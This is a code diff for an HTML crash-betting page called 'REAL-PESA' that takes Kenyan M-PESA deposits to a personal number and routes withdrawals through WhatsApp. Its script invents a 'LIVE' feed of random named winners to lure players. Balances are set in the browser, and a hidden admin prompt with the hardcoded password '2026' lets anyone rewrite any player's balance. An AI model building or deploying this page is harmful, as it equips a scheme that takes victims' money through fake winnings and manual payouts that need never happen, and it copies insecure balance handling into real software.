@@ -8,5 +8,150 @@ body{font-family:'Segoe UI',sans-serif;margin:0;background:var(--d);color:#fff;t
 header{background:var(--p);padding:15px;font-weight:bold;cursor:pointer;border-bottom:2px solid #1b5e20;position:relative;}
 .logo{font-size:1.6rem;letter-spacing:1px;text-transform:uppercase;font-weight:900;}
 #bal{position:absolute;right:10px;top:20px;font-size:0.75rem;color:#fff;background:rgba(0,0,0,0.3);padding:4px 8px;border-radius:5px;}
-.how-to{background:#1a1a1
+.how-to{background:#1a1a1a;margin:10px;padding:12px;border-radius:12px;border:1px solid #333;text-align:left;font-size:0.8rem;color:#ccc;}
+.how-to b{color:var(--m);display:block;margin-bottom:4px;}
+.hist{background:var(--g);padding:10px;font-size:0.75rem;border-bottom:1px solid #333;color:#aaa;white-space:nowrap;overflow-x:auto;display:flex;align-items:center;gap:8px;}
+.h-item{background:#333;padding:4px 10px;border-radius:20px;color:var(--m);font-weight:bold;flex-shrink:0;}
+.h-item.crash{color:var(--r);}
+.game{background:linear-gradient(180deg, #111 0%, #000 100%);margin:15px;height:200px;border-radius:20px;border:1px solid #333;display:flex;flex-direction:column;justify-content:center;position:relative;}
+#mult{font-size:4.5rem;font-weight:bold;margin:0;}
+#stat{color:#aaa;font-size:0.8rem;letter-spacing:2px;text-transform:uppercase;}
+.ctrl{padding:25px 20px;background:var(--g);margin:15px;border-radius:25px;border:1px solid #333;}
+input{width:90%;padding:15px;margin-bottom:15px;border-radius:12px;border:1px solid #444;background:#111;color:#fff;font-size:1rem;text-align:center;}
+.btn{width:100%;padding:20px;border:none;border-radius:15px;font-weight:bold;font-size:1.4rem;cursor:pointer;margin-bottom:15px;text-transform:uppercase;}
+.bet{background:var(--m);color:#fff;}
+.cash{background:#fbc02d;color:#000;display:none;}
+.dep-btn{background:var(--p);color:#fff;flex:1;padding:15px;border-radius:12px;font-size:1rem;}
+.wd-btn{background:#25d366;color:#fff;flex:1;padding:15px;border-radius:12px;font-size:1rem;}
+.tx-list{margin:15px;background:var(--g);padding:18px;border-radius:20px;border:1px solid #333;text-align:left;max-height: 250px; overflow: hidden;}
+.tx-header{font-weight:bold;color:var(--m);margin-bottom:12px;display:block;}
+.tx-item{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #222;font-size:0.85rem; animation: slideIn 0.5s ease-out;}
+@keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+.win-c{color:var(--m);font-weight:bold;}
+.live-tag{background:var(--r);color:white;padding:2px 4px;border-radius:3px;font-size:0.6rem;margin-right:8px;font-weight:bold;}
+.footer-box{background:#0a0a0a;padding:20px;border-top:1px solid #222;margin-top:20px;}
+.dep-steps{text-align:left;font-size:0.8rem;color:#aaa;margin-bottom:15px;background:#111;padding:10px;border-radius:10px;}
+.dep-steps b{color:#fff;display:block;margin-bottom:5px;}
+</style></head><body>
+
+<header id="adminTrigger">
+    <div class="logo">REAL-PESA</div>
+    <span id="bal">Wallet: KES 0.00</span>
+</header>
+
+<div class="how-to"><b>HOW TO PLAY:</b> 1. Enter Bet. 2. Tap PLACE BET. 3. CASH OUT before crash to win!</div>
+<div class="hist" id="roundHist">History: <span class="h-item">1.54x</span></div>
+<div class="game"><div id="mult">1.00x</div><div id="stat">READY</div></div>
+
+<div class="ctrl">
+    <input type="number" id="amt" placeholder="Bet Amount">
+    <button id="betBtn" class="btn bet" onclick="placeBet()">PLACE BET</button>
+    <button id="cashBtn" class="btn cash" onclick="cashOut()">CASH OUT</button>
+    <div style="display:flex;gap:10px;">
+        <button class="dep-btn" onclick="deposit()">DEPOSIT</button>
+        <button class="wd-btn" onclick="withdraw()">WITHDRAW</button>
+    </div>
+</div>
+
+<div class="tx-list">
+    <span class="tx-header">Recent Transactions</span>
+    <div id="tx-data"></div>
+</div>
+
+<div class="footer-box">
+    <div class="dep-steps">
+        <b>HOW TO DEPOSIT:</b>
+        1. Go to M-PESA > Lipa na M-PESA<br>
+        2. Select Pochi la Biashara<br>
+        3. Enter Number: 0797097831<br>
+        4. Send money and wait for approval.
+    </div>
+    <div style="color:var(--m);font-weight:bold;">OFFICIAL POCHI: 0797097831</div>
+</div>
+
+<script>
+// !!! YOUR FIREBASE CONFIG !!!
+const firebaseConfig = { apiKey: "YOUR_KEY", projectId: "YOUR_ID", appId: "YOUR_APP" };
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+
+// AUDIO FILES
+const winSound = new Audio('https://www.soundjay.com/buttons/sounds/button-37a.mp3');
+const crashSound = new Audio('https://www.soundjay.com/buttons/sounds/button-10.mp3');
+const flySound = new Audio('https://www.soundjay.com/misc/sounds/jet-passing-over-01.mp3');
+flySound.loop = true;
+
+let m=1.0, isFlying=false, myBet=0, wallet=0, iv, currentUser="User_"+Math.floor(Math.random()*999);
+const x=document.getElementById('mult'), s=document.getElementById('stat'), b=document.getElementById('betBtn'), cb=document.getElementById('cashBtn'), bl=document.getElementById('bal'), rh=document.getElementById('roundHist');
+
+window.onload = () => {
+    loop(); 
+    startLiveTransactions();
+    db.collection("players").doc(currentUser).onSnapshot((doc) => {
+        if(doc.exists) { wallet = doc.data().balance; bl.innerText = "Wallet: KES " + wallet.toFixed(2); }
+    });
+};
+
+function startLiveTransactions() {
+    const names = ["Kamau", "Fatuma", "Otieno", "Blessing", "Maina", "Kiplangat", "Achieng", "Mwangi", "Junior"];
+    const container = document.getElementById('tx-data');
+    setInterval(() => {
+        const name = names[Math.floor(Math.random() * names.length)];
+        const winAmount = (Math.random() * 4500 + 200).toFixed(0);
+        const newTx = document.createElement('div');
+        newTx.className = 'tx-item';
+        newTx.innerHTML = `<span><span class="live-tag">LIVE</span>${name} - Won Round</span><span class="win-c">KES ${winAmount}</span>`;
+        container.insertBefore(newTx, container.firstChild);
+        if (container.children.length > 6) container.removeChild(container.lastChild);
+    }, 3500);
+}
+
+function loop(){ 
+    isFlying=true; m=1.0; x.style.color="#fff"; s.innerText="FLYING...";
+    flySound.play(); // Start flying sound
+    let crash=(Math.random()*5+1.2).toFixed(2);
+    db.collection("game_settings").doc("current_round").set({ next_crash: crash });
+    iv=setInterval(()=>{
+        m+=0.01; x.innerText=m.toFixed(2)+"x";
+        if(m>=crash){
+            clearInterval(iv); isFlying=false; x.innerText="CRASHED!"; x.style.color="var(--r)"; s.innerText="READY";
+            flySound.pause(); flySound.currentTime = 0; // Stop flying sound
+            crashSound.play(); // Play crash sound
+            
+            let item = document.createElement("span");
+            item.className = "h-item " + (crash < 2 ? "crash" : "");
+            item.innerText = crash + "x";
+            rh.insertBefore(item, rh.firstChild.nextSibling);
+            b.style.display="block"; cb.style.display="none"; setTimeout(loop, 7000);
+        }
+    },100);
+}
+
+function placeBet(){ 
+    let a=parseFloat(document.getElementById('amt').value); 
+    if(wallet>=a){myBet=a; wallet-=a; b.style.display="none"; cb.style.display="block";
+    db.collection("players").doc(currentUser).update({ balance: wallet });} 
+}
+
+function cashOut(){ 
+    if(myBet>0 && isFlying){ 
+        winSound.play(); // Play win sound
+        wallet+=(myBet*m); b.style.display="block"; cb.style.display="none"; myBet=0; 
+        db.collection("players").doc(currentUser).update({ balance: wallet });
+        alert("Win! Cashout at " + m.toFixed(2) + "x");
+    } 
+}
+
+document.getElementById('adminTrigger').addEventListener('dblclick', () => {
+    const pass = prompt("Admin Password:");
+    if (pass === "2026") { 
+        const targetId = prompt("Player ID:");
+        const amount = parseFloat(prompt("Amount:"));
+        db.collection("players").doc(targetId).set({ balance: amount }, { merge: true });
+    }
+});
+
+function deposit(){ window.location.href="https://wa.me/254797097831?text=Deposit%20ID:%20"+currentUser; }
+function withdraw(){ window.location.href="https://wa.me/254797097831?text=Withdraw%20ID:%20"+currentUser; }
+</script></body></html>
     
